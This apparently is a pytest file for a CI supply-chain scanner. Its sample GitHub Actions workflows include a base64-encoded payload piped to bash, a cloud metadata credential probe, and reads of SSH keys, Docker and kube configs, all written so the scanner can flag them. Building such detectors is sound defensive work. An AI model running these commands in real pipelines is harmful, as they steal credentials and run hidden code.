from __future__ import annotations

import json

from click.testing import CliRunner

from ca9.analyzers.github_actions import analyze_github_actions_workflows
from ca9.cli import main
from ca9.inventory import build_inventory
from ca9.supply_chain import build_supply_chain_report, supply_chain_report_to_table


def test_github_actions_analyzer_flags_pull_request_target_pr_checkout(tmp_path):
    workflow_dir = tmp_path / ".github" / "workflows"
    workflow_dir.mkdir(parents=True)
    (workflow_dir / "bundle-size.yml").write_text(
        """
on:
  pull_request_target:

jobs:
  benchmark:
    steps:
      - uses: actions/checkout@v6.0.2
        with:
          ref: refs/pull/${{ github.event.pull_request.number }}/merge
      - run: pnpm nx run @benchmarks/bundle-size:build
""".strip()
    )

    findings = analyze_github_actions_workflows(tmp_path)

    assert any(
        finding.signal_type == "github_actions_pull_request_target_checkout" for finding in findings
    )
    checkout = next(
        finding
        for finding in findings
        if finding.signal_type == "github_actions_pull_request_target_checkout"
    )
    assert checkout.severity == "critical"
    assert checkout.metadata["action"] == "block"


def test_github_actions_analyzer_flags_oidc_and_write_permissions(tmp_path):
    workflow_dir = tmp_path / ".github" / "workflows"
    workflow_dir.mkdir(parents=True)
    (workflow_dir / "release.yml").write_text(
        """
on:
  push:
    branches: [main]

permissions:
  contents: write
  id-token: write

jobs:
  release:
    steps:
      - uses: actions/checkout@v6.0.2
      - run: pnpm test
""".strip()
    )

    signal_types = {finding.signal_type for finding in analyze_github_actions_workflows(tmp_path)}

    assert "github_actions_oidc_write" in signal_types
    assert "github_actions_write_permissions" in signal_types


def test_github_actions_analyzer_flags_ci_credential_harvest_payloads(tmp_path):
    workflow_dir = tmp_path / ".github" / "workflows"
    workflow_dir.mkdir(parents=True)
    (workflow_dir / "optimize-build.yml").write_text(
        """
on:
  push:
    branches: [main]

jobs:
  optimize:
    steps:
      - run: |
          echo "Y3VybCAtZnNTIGh0dHBzOi8vZXhhbXBsZS5jb20K" | base64 -d | bash
          curl -fsS http://169.254.169.254/latest/meta-data/iam/security-credentials/
          cat ~/.ssh/id_rsa ~/.docker/config.json ~/.kube/config
""".strip()
    )

    findings = analyze_github_actions_workflows(tmp_path)
    signal_types = {finding.signal_type for finding in findings}

    assert "github_actions_encoded_shell_payload" in signal_types
    assert "github_actions_cloud_metadata_probe" in signal_types
    assert "github_actions_credential_file_harvest" in signal_types
    encoded_payload = next(
        finding
        for finding in findings
        if finding.signal_type == "github_actions_encoded_shell_payload"
    )
    assert encoded_payload.severity == "critical"
    assert encoded_payload.metadata["action"] == "block"


def test_vet_table_gives_workflow_backdoor_next_steps(tmp_path):
    workflow_dir = tmp_path / ".github" / "workflows"
    workflow_dir.mkdir(parents=True)
    (workflow_dir / "optimize-build.yml").write_text(
        """
on:
  push:

jobs:
  optimize:
    steps:
      - run: echo "Y3VybAo=" | base64 -d | bash
""".strip()
    )

    findings = analyze_github_actions_workflows(tmp_path)
    report = build_supply_chain_report(build_inventory(tmp_path), extra_findings=findings)

    table = supply_chain_report_to_table(report)

    assert "Why: base64-decoded shell payloads are a common CI credential-stealing technique" in table
    assert "Next: block the change and inspect recent workflow runs for credential exposure" in table


def test_vet_cli_can_scan_workflows(tmp_path):
    workflow_dir = tmp_path / ".github" / "workflows"
    workflow_dir.mkdir(parents=True)
    (workflow_dir / "token-access-review.yml").write_text(
        """
on:
  workflow_dispatch:

permissions:
  contents: write
  actions: write
  id-token: write

jobs:
  review:
    steps:
      - uses: actions/checkout@v6.0.2
      - run: gh repo clone example/private-repo
""".strip()
    )

    runner = CliRunner()
    result = runner.invoke(main, ["vet", "--repo", str(tmp_path), "--scan-workflows", "-f", "json"])

    assert result.exit_code == 1
    data = json.loads(result.output)
    signal_types = {finding["signal_type"] for finding in data["findings"]}
    assert "github_actions_oidc_write" in signal_types
    assert "github_actions_source_clone" in signal_types
